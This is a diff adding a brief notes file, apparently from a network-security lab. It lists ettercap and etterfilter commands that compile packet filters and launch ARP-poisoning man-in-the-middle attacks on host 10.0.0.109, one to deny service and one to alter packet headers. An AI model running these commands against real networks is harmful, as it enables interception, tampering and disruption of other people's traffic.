@@ -1,0 +1,12 @@
+DENIAL OF SERVICE:
+
+sudo etterfilter ip_DoS.filter -o ip_DoS.ef
+
+sudo ettercap -Tq -F ip_DoS.ef -M arp:remote /10.0.0.109/ //
+
+
+CHANGE HEADER FILE:
+
+sudo etterfilter ip_change_header.filter -o ip_change_header.ef
+
+sudo ettercap -Tq -F ip_change_header.ef -M arp:remote /10.0.0.109/ //
